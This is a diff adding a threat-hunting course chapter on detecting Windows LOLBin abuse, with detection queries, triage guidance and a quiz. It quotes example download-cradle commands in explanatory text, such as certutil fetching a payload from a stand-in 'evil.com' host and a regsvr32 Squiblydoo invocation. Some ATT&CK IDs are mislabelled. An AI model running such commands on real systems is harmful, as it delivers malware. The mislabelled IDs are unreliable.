@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="09">
+  <meta name="module-id" content="threat-hunting">
+  <title>Hunting LOLBin Abuse · Threat Hunting · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <a href="../index.html" class="logo-link">
+          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
+        </a>
+        <div class="nav-pill">
+          <span class="nav-pill-name">H3AD-LEARN</span>
+          <span class="nav-pill-sep">·</span>
+          <span class="nav-pill-tagline">HUNTING LOLBINS</span>
+        </div>
+      </div>
+      <nav class="header-nav">
+        <a href="../index.html" class="nav-link">Hub</a>
+        <a href="index.html" class="nav-link">Threat Hunting</a>
+        <a href="../lolbas/index.html" class="nav-link">LOLBAS</a>
+      </nav>
+      <div class="header-actions">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">← Threat Hunting</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 09 of 9</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">40 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 7 sections</span>
+      </div>
+    </aside>
+    <main class="chapter-body" id="chapterBody">
+      <article>
+        <header class="chapter-header">
+          <div class="chapter-meta">
+            <span class="badge-module mono">CHAPTER 09</span>
+            <span class="badge-time muted mono">40 MIN READ</span>
+            <span class="badge-diff badge-advanced">ADVANCED</span>
+          </div>
+          <h1 class="chapter-title">Hunting LOLBin Abuse</h1>
+          <p class="chapter-intro">Adversaries use Windows' own tools against you. Certutil downloads implants. Mshta runs HTA payloads. Regsvr32 loads remote scriptlets with a single command line. No binary dropped, no hash to block, everything blending with normal admin activity. The standard detection playbook fails because there is nothing foreign to flag. This chapter applies the full ABLE/PEAK framework to finding LOLBin abuse before the SIEM ever fires.</p>
+          <div class="chapter-tags">
+            <span class="tag">LOLBins</span>
+            <span class="tag">T1218</span>
+            <span class="tag">defense evasion</span>
+          </div>
+        </header>
+
+        <!-- SECTION 1 -->
+        <section class="content-section" id="what-are-lolbins">
+          <h2>What Are LOLBins and Why Hunters Care</h2>
+          <p>LOLBins are legitimate Windows binaries repurposed by attackers. The key word is legitimate. The tool ships with every Windows installation, carries a valid Microsoft signature, and runs without triggering antivirus or application whitelisting controls. No payload is dropped to disk. No new executable needs to be created. The attacker borrows the OS to do the job.</p>
+          <p>That is the core detection problem. Certutil.exe is always benign as a file. Certutil.exe running with <code>-urlcache -f http://185.220.101.x/payload.exe</code> and writing to <code>%TEMP%</code> is not. The binary cannot be the indicator. The execution context must be.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Category</th>
+                  <th>Definition</th>
+                  <th>Examples</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>LOLBins</td>
+                  <td>Signed Windows executables used for malicious purposes</td>
+                  <td>certutil, mshta, regsvr32, rundll32, bitsadmin</td>
+                </tr>
+                <tr>
+                  <td>LOLScripts</td>
+                  <td>Built-in scripting engines abused for execution</td>
+                  <td>PowerShell, WScript, CScript, msiexec</td>
+                </tr>
+                <tr>
+                  <td>LOLLibs</td>
+                  <td>.NET assemblies and COM components loaded for proxy execution</td>
+                  <td>mscorsvw.exe, .NET assemblies via InstallUtil</td>
+                </tr>
+                <tr>
+                  <td>LOLDrivers</td>
+                  <td>Vulnerable signed kernel drivers used to disable EDR</td>
+                  <td>BYOVD drivers (e.g., GIGABYTE, RTCore64.sys)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>The ATT&CK anchor is T1218 Signed Binary Proxy Execution, which covers 12 subtechniques: T1218.001 (InstallUtil), T1218.003 (CMSTP), T1218.004 (InstallUtil), T1218.005 (Mshta), T1218.007 (Msiexec), T1218.008 (Odbcconf), T1218.009 (Regasm/Regsvcs), T1218.010 (Regsvr32), T1218.011 (Rundll32), T1218.012 (Verclsid), T1218.013 (Mavinject), and T1218.014 (MMC). Each subtechnique has a distinct behavior profile and requires its own detection approach.</p>
+
+          <p>The community catalog is the <strong>LOLBAS Project</strong> at lolbas-project.github.io. It documents 150+ LOLBins with function tags (execute, download, upload, compile, decode), command-line examples, and ATT&CK mappings. Treat it as a required reference alongside ATT&CK Navigator for hunt hypothesis generation.</p>
+
+          <div class="callout-info"><strong>Note:</strong> LOLBin abuse is one of the primary dwell-time drivers. Red Canary's Threat Detection Report consistently places mshta and certutil in the top 10 most observed techniques year over year. Adversaries keep using them because defenders keep failing to detect them reliably.</div>
+        </section>
+
+        <!-- SECTION 2 -->
+        <section class="content-section" id="hunting-mindset">
+          <h2>The Hunting Mindset for LOLBin Abuse</h2>
+          <p>Signatures fail here. AV and EDR cannot flag the binary itself because it is a clean system tool. Detection requires behavioral context, and behavioral context has four dimensions.</p>
+          <p>Parent process: who spawned it? A user launching certutil directly from explorer.exe is suspicious. Winword.exe spawning certutil is nearly always malicious. The parent-child relationship is often more telling than the command line itself.</p>
+          <p>Command line flags: what arguments? Certutil is a certificate utility. Any invocation that references <code>-urlcache</code>, <code>-decode</code>, or <code>-encode</code> with a non-certificate-related path is worth examining.</p>
+          <p>Network behavior: did it make outbound connections? Download cradles require DNS resolution and HTTP(S) requests. Certutil reaching an external IP is a process-to-network correlation opportunity.</p>
+          <p>Execution directory: from System32 or from <code>%TEMP%</code>? LOLBins themselves run from System32 or SysWOW64. The files they write or load often land in user-writable paths like <code>%TEMP%</code>, <code>%APPDATA%</code>, or <code>C:\Users\Public</code>.</p>
+
+          <p>Three ABLE hypotheses applied directly:</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Actor</th>
+                  <th>Behavior</th>
+                  <th>Location</th>
+                  <th>Evidence</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>TA operator (post-exploitation)</td>
+                  <td>certutil.exe with -urlcache flag reaching non-Microsoft IP</td>
+                  <td>Standard user workstation</td>
+                  <td>Sysmon EID 1 + EID 3 correlation on same PID</td>
+                </tr>
+                <tr>
+                  <td>Initial access broker</td>
+                  <td>mshta.exe spawning cmd.exe or powershell.exe</td>
+                  <td>User workstation post-email open</td>
+                  <td>Process creation chain: outlook.exe or winword.exe parent</td>
+                </tr>
+                <tr>
+                  <td>Commodity malware (Squiblydoo)</td>
+                  <td>regsvr32.exe with /s /u /i and URL argument</td>
+                  <td>Any endpoint</td>
+                  <td>Sysmon EID 1 CommandLine containing http</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>Prioritize certutil and mshta first. They sit at the top of Red Canary's detection reports for multiple consecutive years. Regsvr32 Squiblydoo was actively exploited for 8+ years before widespread detection caught up. BITS (bitsadmin and PowerShell Start-BitsTransfer) is heavily used for stealthy persistence and background downloads because it runs as a Windows service and is trusted by most security tools.</p>
+        </section>
+
+        <!-- SECTION 3 -->
+        <section class="content-section" id="data-sources">
+          <h2>Data Sources for LOLBin Hunting</h2>
+          <p>The foundation is Sysmon Event ID 1 (process creation) with full command line captured. Without the CommandLine field, LOLBin hunting is nearly blind. You know a binary ran. You do not know what it was told to do.</p>
+          <p>Windows Security Event 4688 covers process creation but requires an explicit GPO change to capture command line arguments: Computer Config > Policies > Windows Settings > Security Settings > Advanced Audit Policy > Detailed Tracking > Audit Process Creation, PLUS enable "Include command line in process creation events" via a separate GPO setting. Without this, 4688 tells you certutil.exe ran. It does not tell you whether it ran a hash check or a download cradle.</p>
+
+          <div class="callout-warning"><strong>Warning:</strong> Windows 4688 without the command line audit policy gives you a process name with no context. You cannot distinguish <code>certutil -hashfile</code> (legitimate integrity check) from <code>certutil -urlcache -f http://evil.com/payload</code> without the ProcessCommandLine field. This configuration gap is one of the most common reasons LOLBin hunts produce nothing actionable despite real activity occurring.</div>
+
+          <p>Sysmon Event ID 3 (network connection) links a LOLBin process to outbound connections by PID. This is the critical correlation for download cradles. Sysmon EID 1 tells you the command line; EID 3 tells you the destination IP and port. Together they confirm intent.</p>
+          <p>Sysmon Event ID 11 (file creation) catches certutil or wscript writing staged payloads to disk. Pair with EID 1 to connect file creation back to the specific process invocation.</p>
+          <p>Modern EDR provides full ancestry chains. Winword.exe > cmd.exe > certutil.exe is a high-confidence indicator regardless of what certutil was told to do. The parent chain establishes context before you even look at the command line.</p>
+          <p>DNS logs catch download cradles at resolution time. Certutil reaching a DGA-pattern domain is visible in DNS before Sysmon fires. DNS is also useful for BITS abuse, where the job may run as a background service with limited process-level telemetry.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>LOLBin</th>
+                  <th>Key Sysmon EID</th>
+                  <th>Key Field to Query</th>
+                  <th>Detection Pattern</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>certutil.exe</td>
+                  <td>EID 1 + EID 3</td>
+                  <td>CommandLine, DestinationIp</td>
+                  <td>-urlcache or -decode flag with non-Microsoft outbound connection</td>
+                </tr>
+                <tr>
+                  <td>mshta.exe</td>
+                  <td>EID 1</td>
+                  <td>ParentImage, CommandLine</td>
+                  <td>Parent = Office app, or child = cmd/powershell spawned from mshta</td>
+                </tr>
+                <tr>
+                  <td>regsvr32.exe</td>
+                  <td>EID 1</td>
+                  <td>CommandLine</td>
+                  <td>/s /u /i with http URL (Squiblydoo)</td>
+                </tr>
+                <tr>
+                  <td>bitsadmin.exe</td>
+                  <td>EID 1</td>
+                  <td>CommandLine</td>
+                  <td>/transfer or /addfile to non-WSUS/non-Microsoft destination</td>
+                </tr>
+                <tr>
+                  <td>rundll32.exe</td>
+                  <td>EID 1 + EID 7</td>
+                  <td>CommandLine, ImageLoaded</td>
+                  <td>DLL path outside System32/SysWOW64 (user-writable path)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- SECTION 4 -->
+        <section class="content-section" id="hunt-hypotheses">
+          <h2>Hunt Hypotheses for LOLBin Abuse</h2>
+          <p>Five prioritized hypotheses, each anchored to ATT&CK, a specific behavior pattern, and the evidence source that confirms or denies it.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>TTP</th>
+                  <th>Behavior</th>
+                  <th>Evidence Required</th>
+                  <th>Priority</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>T1105 / T1218.001<br>certutil download cradle</td>
+                  <td>certutil.exe with -urlcache, -decode, or -encode flags; outbound HTTP(S) to non-Microsoft domain</td>
+                  <td>Sysmon EID 1 (CommandLine) + EID 3 (DestinationIp, DestinationPort)</td>
+                  <td>Critical</td>
+                </tr>
+                <tr>
+                  <td>T1218.010<br>Regsvr32 Squiblydoo</td>
+                  <td>regsvr32.exe with /s /u /i http[s]://... — AppLocker bypass active since 2016, may spawn child processes</td>
+                  <td>Sysmon EID 1 (CommandLine contains http), optionally EID 1 for child process</td>
+                  <td>Critical</td>
+                </tr>
+                <tr>
+                  <td>T1218.005<br>MSHTA proxy execution</td>
+                  <td>mshta.exe spawning cmd, powershell, wscript, cscript, or regsvr32; or mshta CommandLine contains http://</td>
+                  <td>Sysmon EID 1, ParentImage = mshta.exe with child = cmd/powershell</td>
+                  <td>High</td>
+                </tr>
+                <tr>
+                  <td>T1197<br>BITS job persistence/download</td>
+                  <td>bitsadmin /transfer to non-WSUS/non-Microsoft destination, or PowerShell Start-BitsTransfer</td>
+                  <td>Sysmon EID 1 + BITS Operational event log (Microsoft-Windows-Bits-Client/Operational)</td>
+                  <td>High</td>
+                </tr>
+                <tr>
+                  <td>T1218.011<br>Rundll32 non-system DLL</td>
+                  <td>rundll32.exe loading DLL from %TEMP%, %APPDATA%, C:\Users\*, or other user-writable paths</td>
+                  <td>Sysmon EID 1 (CommandLine DLL path), EID 7 (ImageLoaded path outside System32)</td>
+                  <td>Medium</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="callout-tip"><strong>Tip:</strong> Score each hypothesis before hunting. Intel prevalence (is this TTP active in recent threat reports?), data coverage (do you have Sysmon EID 1 with CommandLine?), and environmental baseline frequency (how often does certutil run in your org legitimately?) are the three inputs. Hunt the highest-scoring hypothesis first.</div>
+        </section>
+
+        <!-- SECTION 5 -->
+        <section class="content-section" id="hunt-queries">
+          <h2>Hunt Queries: KQL, SPL, and Sigma</h2>
+          <p>Four queries covering the highest-priority hypotheses. Run these broad first, then apply the tuning steps described after each block.</p>
+
+          <p><strong>KQL: certutil download cradle (Microsoft Sentinel / MDE)</strong></p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">KQL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>DeviceProcessEvents
+| where FileName =~ "certutil.exe"
+| where ProcessCommandLine has_any ("-urlcache", "-decode", "-encode")
+    or ProcessCommandLine has "http"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
+          InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <p><strong>KQL: regsvr32 Squiblydoo (Microsoft Sentinel / MDE)</strong></p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">KQL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>DeviceProcessEvents
+| where FileName =~ "regsvr32.exe"
+| where ProcessCommandLine has "http" and ProcessCommandLine has_any ("/s", "/u", "/i")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp desc</code></pre>
+          </div>
+
+          <p><strong>Sigma: MSHTA spawning suspicious child process</strong></p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">SIGMA</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>title: MSHTA Spawning Suspicious Child Process
+id: a8be5f60-5dc6-4862-8a2c-b43f5b7b0e85
+status: test
+description: mshta.exe spawning cmd, powershell, wscript, cscript, or regsvr32
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith: '\mshta.exe'
+    Image|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+      - '\wscript.exe'
+      - '\cscript.exe'
+      - '\regsvr32.exe'
+  condition: selection
+falsepositives:
+  - Legitimate HTA administrative applications
+level: high
+tags:
+  - attack.execution
+  - attack.t1218.005</code></pre>
+          </div>
+
+          <p><strong>SPL: BITS abuse (Splunk with Sysmon)</strong></p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">SPL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>index=sysmon EventCode=1 Image="*\\bitsadmin.exe"
+| where match(CommandLine, "(?i)/transfer|/addfile")
+| eval dest=mvindex(split(CommandLine, " "), -1)
+| where NOT match(dest, "(?i)microsoft\.com|windows\.com|windowsupdate")
+| table _time, ComputerName, User, CommandLine
+| sort -_time</code></pre>
+          </div>
+
+          <p>Tuning order: start broad, then layer context. For certutil, first suppress hash-check invocations (<code>certutil -hashfile</code> with no URL) by filtering out CommandLine where http is absent. Then add a parent process allow-list for WSUS relay servers where certutil running outbound is normal. For BITS, extend the destination domain allow-list to include your CDN providers and patch management servers. Do not suppress the rule. Add context to narrow it.</p>
+
+          <div class="callout-tip"><strong>Tip:</strong> The certutil KQL query will hit on legitimate WSUS activity in environments with relay servers. Before adding suppressions, check whether those WSUS servers are themselves generating the events (they should be admin assets) or whether it is user workstations that happen to download from Microsoft. Same binary, different risk profile.</div>
+        </section>
+
+        <!-- SECTION 6 -->
+        <section class="content-section" id="evidence-triage">
+          <h2>Evidence Analysis and Triage</h2>
+          <p>Query results are not findings. They are candidates. Triage separates false positives from real signals using execution context, not gut feel.</p>
+
+          <p>Common false positive patterns per LOLBin:</p>
+          <ul>
+            <li><strong>certutil:</strong> <code>certutil -hashfile</code> is a common integrity check tool. Certutil reaching windowsupdate.microsoft.com or download.microsoft.com is typical WSUS relay behavior. Neither pattern warrants escalation.</li>
+            <li><strong>regsvr32:</strong> Registering COM DLLs in System32 during software installs is normal. The path matters. System32 paths are benign; user-writable paths are not.</li>
+            <li><strong>mshta.exe:</strong> Legitimate HTA-based admin tools exist, though they are uncommon. Validate the parent process and the HTA source path before closing as FP.</li>
+            <li><strong>bitsadmin:</strong> WSUS, SCCM, and Windows Update all use BITS. Filter known WSUS server destinations before treating BITS transfers as suspicious.</li>
+          </ul>
+
+          <p>Context factors in priority order when triaging a hit:</p>
+          <ol>
+            <li>Execution account: admin service account vs. standard user</li>
+            <li>Parent process: explorer.exe (user-initiated) vs. winword.exe (document macro) vs. lsass.exe (injection)</li>
+            <li>Asset classification: domain controller vs. developer workstation vs. standard user endpoint</li>
+            <li>Time context: business hours during maintenance window vs. 3am on a weekend</li>
+            <li>Network destination: known CDN/WSUS IP vs. residential IP vs. DGA-pattern domain</li>
+          </ol>
+
+          <p>Apply the Admiralty System to score confidence. Source A (EDR telemetry) plus content grade 1 (directly observed, no inference) gives you maximum confidence. Source A plus content grade 2 (observed but requiring correlation) is still high confidence. Downgrade when you are working from proxy logs alone with no process-level confirmation.</p>
+
+          <p>The pivot chain from a certutil hit to IR escalation: certutil.exe reaching 185.220.101.x (Tor exit node) -> pivot on that IP across all endpoints in the time window -> identify every process that contacted the same IP -> check for lateral movement events (4648, 4624 type 3, SMB) from those hosts -> if you find more than one host reaching the same C2 IP, you have a campaign, not an isolated incident.</p>
+
+          <p>Decision criteria: admin account on admin asset reaching a known patch server is a documented FP. Write a suppression query and close. Standard user account on a user workstation reaching a residential IP with mshta spawning powershell is escalate to IR immediately. Do not wait for a SIEM alert. The hunt found the incident.</p>
+        </section>
+
+        <!-- SECTION 7 -->
+        <section class="content-section" id="hunt-to-detection">
+          <h2>From Hunt to Detection</h2>
+          <p>Every LOLBin hunt closes with content. Either a suppression query documenting a confirmed FP, or a new detection rule derived from a confirmed TP. Hunts that produce no content are organizational debt because you spent analyst time without improving coverage.</p>
+
+          <p>Converting a hunt query to a production rule: add parent process suppression for known-good parents (WSUS server spawning certutil), add destination domain allow-list for BITS transfers, add asset severity scoring so a hit on a DC generates a P1 and the same hit on an isolated dev box generates a P3. Set a confidence threshold before the rule fires an alert. Not every hit needs to page someone. Some can go into a triage queue.</p>
+
+          <p>Sigma versus platform-native: use Sigma when the content needs to run on multiple SIEM or EDR platforms. Use KQL or SPL for environment-specific enrichment joins. Joining certutil events to your user risk score (from Microsoft Entra ID Protection or CrowdStrike Identity) is not expressible in Sigma. Do both. Sigma for portability, platform-native for enriched alerting.</p>
+
+          <div class="callout-info"><strong>Note:</strong> This chapter applies threat-hunting methodology to LOLBin abuse. For the complete catalog of Windows LOLBins, LOLScripts, LOLDrivers, attacker tradecraft, threat actor campaigns, and advanced evasion techniques, continue to the LOLBAS module. <a href="../lolbas/index.html" class="accent">Start LOLBAS: Chapter 1 →</a></div>
+
+          <p>Five highest-ROI LOLBin detections to build first, ranked by detection complexity and expected false positive rate:</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Detection</th>
+                  <th>TTP</th>
+                  <th>Detection Complexity</th>
+                  <th>FP Rate</th>
+                  <th>Notes</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>certutil outbound download</td>
+                  <td>T1105 / T1218.001</td>
+                  <td>Low</td>
+                  <td>Low</td>
+                  <td>EID 1 + EID 3 correlation. Add WSUS suppression.</td>
+                </tr>
+                <tr>
+                  <td>mshta spawning child process</td>
+                  <td>T1218.005</td>
+                  <td>Low</td>
+                  <td>Low</td>
+                  <td>Parent-child query. Very few legitimate HTA tools spawn cmd/PS.</td>
+                </tr>
+                <tr>
+                  <td>regsvr32 remote URL (Squiblydoo)</td>
+                  <td>T1218.010</td>
+                  <td>Low</td>
+                  <td>Low</td>
+                  <td>CommandLine http match. Legitimate regsvr32 rarely uses URLs.</td>
+                </tr>
+                <tr>
+                  <td>BITS non-WSUS download</td>
+                  <td>T1197</td>
+                  <td>Medium</td>
+                  <td>Medium</td>
+                  <td>Requires destination allow-list. BITS legitimate use is broad.</td>
+                </tr>
+                <tr>
+                  <td>rundll32 non-system-path DLL</td>
+                  <td>T1218.011</td>
+                  <td>Medium</td>
+                  <td>Medium</td>
+                  <td>Path-based filter needed. Third-party tools sometimes use %TEMP% DLLs.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <div class="chapter-summary">
+          <h3>Key Takeaways</h3>
+          <ul>
+            <li>LOLBins are legitimate Windows binaries. The binary is never the indicator. Execution context -- parent process, command line, network behavior, and execution path -- is the indicator.</li>
+            <li>T1218 Signed Binary Proxy Execution covers 12+ subtechniques including certutil (T1218.001), mshta (T1218.005), regsvr32 (T1218.010), rundll32 (T1218.011), and installutil (T1218.004).</li>
+            <li>Full command line logging is non-negotiable. Windows 4688 without the command line audit policy or Sysmon EID 1 cannot distinguish certutil -hashfile from certutil -urlcache.</li>
+            <li>Sysmon EID 1 correlated with EID 3 (process creation and network connection from the same binary and PID) is the most reliable LOLBin detection primitive available without EDR.</li>
+            <li>The ABLE framework maps directly: Behavior captures the binary plus flag pattern; Evidence captures the required Sysmon event ID and field; Location narrows the asset scope to reduce FP volume.</li>
+            <li>False positive rates for high-signal patterns (certutil -urlcache to non-Microsoft IP, mshta spawning powershell) are low on standard workstations. Tune by adding parent-process and destination context, not by disabling the rule.</li>
+            <li>Every hunt closes with either a suppression for confirmed FPs or a new detection rule. Hunts that produce no content are organizational debt.</li>
+          </ul>
+        </div>
+
+        <div class="knowledge-check">
+          <h3 class="kc-title">Knowledge Check</h3>
+          <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What single characteristic makes LOLBin abuse fundamentally harder to detect than a standard malware dropper?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. The binary executes in kernel space, bypassing user-mode EDR hooks.</button>
+              <button class="kc-option" data-correct="true">B. The binary is a signed, pre-installed Windows tool, so there is no malicious file hash to detect.</button>
+              <button class="kc-option" data-correct="false">C. LOLBins do not generate Windows Event Log entries.</button>
+              <button class="kc-option" data-correct="false">D. LOLBins execute before antivirus signatures are loaded during boot.</button>
+            </div>
+            <div class="kc-answer">LOLBins are the actual Windows binary -- certutil.exe signed by Microsoft, present on every Windows system. Attackers do not need to drop anything. AV has no malicious hash to match. The only detection surface is behavioral: what arguments the binary ran with, what network connections it made, and what process spawned it.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">Which ATT&CK subtechnique covers regsvr32.exe loading a remote COM scriptlet via the /i argument?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. T1059.001 -- PowerShell</button>
+              <button class="kc-option" data-correct="false">B. T1197 -- BITS Jobs</button>
+              <button class="kc-option" data-correct="true">C. T1218.010 -- Signed Binary Proxy Execution: Regsvr32</button>
+              <button class="kc-option" data-correct="false">D. T1105 -- Ingress Tool Transfer</button>
+            </div>
+            <div class="kc-answer">T1218.010 covers the Squiblydoo technique: regsvr32 /s /u /i:URL scrobj.dll loads a remote COM scriptlet. This technique is notable because regsvr32 is trusted by application whitelisting tools including AppLocker. It was first documented publicly in 2016 and remained consistently observed in the wild for years because the detection gap it exploited was not widely understood.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What is the most critical configuration change required to enable LOLBin hunting via Windows Security events?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Enable Windows Defender real-time protection on all endpoints.</button>
+              <button class="kc-option" data-correct="true">B. Enable the "Include command line in process creation events" group policy setting.</button>
+              <button class="kc-option" data-correct="false">C. Configure NTLM audit logging to capture pass-the-hash attempts.</button>
+              <button class="kc-option" data-correct="false">D. Enable PowerShell script block logging (Event ID 4104).</button>
+            </div>
+            <div class="kc-answer">Windows Security Event 4688 logs process creation but does not capture command line arguments by default. Without the command line, you know certutil.exe ran, but you cannot tell whether it ran a hash check or a URL download. The GPO setting under Detailed Tracking enables the ProcessCommandLine field. This is a prerequisite for any meaningful LOLBin detection via Windows native events. Sysmon Event ID 1 captures command line by default, which is why Sysmon deployments are strongly preferred for LOLBin hunting.</div>
+          </div>
+        </div>
+
+        <nav class="chapter-nav">
+          <a href="08-advanced.html" class="chapter-nav-prev">← Advanced Topics</a>
+          <a href="../lolbas/index.html" class="chapter-nav-next">LOLBAS Module →</a>
+        </nav>
+      </article>
+    </main>
+  </div>
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('09', 7));</script>
+</body>
+</html>
